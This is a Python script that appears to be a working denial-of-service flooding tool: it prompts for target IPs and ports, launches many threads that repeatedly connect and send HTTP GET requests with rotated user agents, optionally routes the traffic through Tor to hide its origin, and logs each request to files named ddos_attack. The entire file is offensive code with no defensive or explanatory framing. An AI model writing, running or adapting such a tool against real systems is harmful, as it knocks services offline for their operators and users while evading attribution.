import os
import time
import socket
import threading
import logging
import subprocess
import socks
from stem import Signal
from stem.control import Controller
import random
import json
import csv

def display_banner():
    banner = (
        "███╗   ███╗██████╗ ██╗     ███████╗████████╗██╗   ██╗███╗   ███╗\n"
        "████╗ ████║██╔══██╗██║     ██╔════╝╚══██╔══╝██║   ██║████╗ ████║\n"
        "██╔████╔██║██████╔╝██║     █████╗     ██║   ██║   ██║██╔████╔██║\n"
        "██║╚██╔╝██║██╔═══╝ ██║     ██╔══╝     ██║   ██║   ██║██║╚██╔╝██║\n"
        "██║ ╚═╝ ██║██║     ███████╗███████╗   ██║   ╚██████╔╝██║ ╚═╝ ██║\n"
        "╚═╝     ╚═╝╚═╝     ╚══════╝╚══════╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝\n"
    )
    print(banner)

logging.basicConfig(filename='ddos_attack.log', level=logging.INFO, format='%(asctime)s - %(message)s')

def log_to_json(entry):
    with open('ddos_attack.json', 'a') as f:
        json.dump(entry, f)
        f.write('\n')

def log_to_csv(entry):
    file_exists = os.path.isfile('ddos_attack.csv')
    with open('ddos_attack.csv', 'a', newline='') as f:
        writer = csv.DictWriter(f, fieldnames=entry.keys())
        if not file_exists:
            writer.writeheader()
        writer.writerow(entry)

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64)"
]

def start_tor_service():
    try:
        subprocess.Popen(["tor"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("Tor service started.")
    except Exception as e:
        print(f"Failed to start Tor service: {e}")
        exit(1)

def renew_tor_identity():
    try:
        with Controller.from_port(port=9051) as controller:
            controller.authenticate()
            controller.signal(Signal.NEWNYM)
            print("Tor identity renewed.")
    except Exception as e:
        print(f"Failed to renew Tor identity: {e}")

def send_packets_via_tor(ip, port, rate_limit):
    while True:
        try:
            sock = socks.socksocket()
            sock.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
            sock.connect((ip, port))

            ua = random.choice(user_agents)
            http_data = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {ip}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Connection: close\r\n\r\n"
            ).encode()

            sock.sendall(http_data)
            print(f"[Tor] Sent request to {ip}:{port} with UA: {ua}")

            entry = {
                "timestamp": time.strftime('%Y-%m-%d %H:%M:%S'),
                "method": "tor",
                "ip": ip,
                "port": port,
                "bytes_sent": len(http_data),
                "user_agent": ua
            }
            log_to_json(entry)
            log_to_csv(entry)

            time.sleep(rate_limit)
        except Exception as e:
            logging.error(f"Error sending packet to {ip}:{port} via Tor: {e}")
        finally:
            try:
                sock.close()
            except:
                pass

def send_packets_direct(ip, port, rate_limit):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))

            ua = random.choice(user_agents)
            http_data = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {ip}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Connection: close\r\n\r\n"
            ).encode()

            sock.sendall(http_data)
            print(f"[Direct] Sent request to {ip}:{port} with UA: {ua}")

            entry = {
                "timestamp": time.strftime('%Y-%m-%d %H:%M:%S'),
                "method": "direct",
                "ip": ip,
                "port": port,
                "bytes_sent": len(http_data),
                "user_agent": ua
            }
            log_to_json(entry)
            log_to_csv(entry)

            time.sleep(rate_limit)
        except Exception as e:
            logging.error(f"Error sending packet to {ip}:{port} directly: {e}")
        finally:
            try:
                sock.close()
            except:
                pass

# === Main Execution ===
if __name__ == "__main__":
    display_banner()

    ips = input("IP Targets (comma-separated): ").split(',')
    ports_input = input("Ports (comma-separated, default 80,443): ")
    ports = list(map(int, ports_input.split(','))) if ports_input else [80, 443]

    rate_limit_input = input("Rate Limit (sec between packets, default 0.1): ")
    rate_limit = float(rate_limit_input) if rate_limit_input else 0.1

    threads_input = input("Number of threads (default 20): ")
    threads = int(threads_input) if threads_input else 20

    use_tor_input = input("Send packets via Tor? (y/n, default y): ").lower()
    use_tor = use_tor_input == 'y' if use_tor_input else True

    burst_size = int(input("Burst size (default 10): ") or 10)
    burst_interval = float(input("Burst interval (sec, default 10): ") or 10)

    if use_tor:
        start_tor_service()
        time.sleep(5)

    time.sleep(2)
    for ip in ips:
        for port in ports:
            print(f"Attacking {ip.strip()}:{port}...")
            total_threads = 0
            while total_threads < threads:
                for _ in range(min(burst_size, threads - total_threads)):
                    t = threading.Thread(
                        target=send_packets_via_tor if use_tor else send_packets_direct,
                        args=(ip.strip(), port, rate_limit)
                    )
                    t.start()
                    total_threads += 1
                print(f"[Burst] Sleeping for {burst_interval} seconds...\n")
                time.sleep(burst_interval)

    input("Press Enter to exit...")
